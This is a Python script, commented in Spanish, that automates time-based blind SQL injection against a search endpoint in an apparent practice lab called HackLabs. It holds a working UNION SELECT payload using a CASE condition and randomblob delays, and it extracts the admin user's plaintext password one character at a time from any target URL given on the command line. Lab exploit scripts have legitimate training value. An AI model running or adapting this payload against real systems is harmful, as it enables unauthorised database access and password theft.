#!/usr/bin/env python3
"""
Script para automatizar la extracción de contraseñas con SQLi Time-Based Blind en HackLabs (modo hard)

Uso:
  python3 sqli_timebased_extractor.py <objetivo>
  # Ejemplo: python3 sqli_timebased_extractor.py <IP>

Si no se indica objetivo, usa http://localhost por defecto.
"""
import requests
import string
import time
import sys

USERNAME = "admin"
MAX_LEN = 32  # Longitud máxima de la contraseña a extraer
CHARS = string.ascii_letters + string.digits + string.punctuation

TIME_THRESHOLD = 2.5  # Segundos para considerar que la condición es verdadera

def extract_password(base_url):
    url = f"{base_url.rstrip('/')}/sqli/search"
    headers = {"User-Agent": "Mozilla/5.0"}
    password = ""
    print(f"[+] Extrayendo password_plain para usuario: {USERNAME} en {url}")
    for pos in range(1, MAX_LEN+1):
        found = False
        for c in CHARS:
            payload = f"' UNION SELECT 0, (CASE WHEN (SELECT SUBSTR(password_plain,{pos},1) FROM users WHERE username='{USERNAME}')='{c}' THEN randomblob(300000000) ELSE 'x' END), 2, 3, 4 FROM products--"
            params = {"q": payload}
            start = time.time()
            try:
                r = requests.get(url, params=params, headers=headers, timeout=10)
            except Exception as e:
                print(f"[!] Error de conexión: {e}")
                return password
            elapsed = time.time() - start
            if elapsed > TIME_THRESHOLD:
                password += c
                print(f"[+] Posición {pos}: {c} (delay {elapsed:.2f}s)")
                found = True
                break
        if not found:
            print(f"[!] Fin de password o carácter no encontrado en posición {pos}")
            break
    print(f"[+] Password extraído: {password}")
    return password

if __name__ == "__main__":
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://localhost"
    extract_password(base_url)
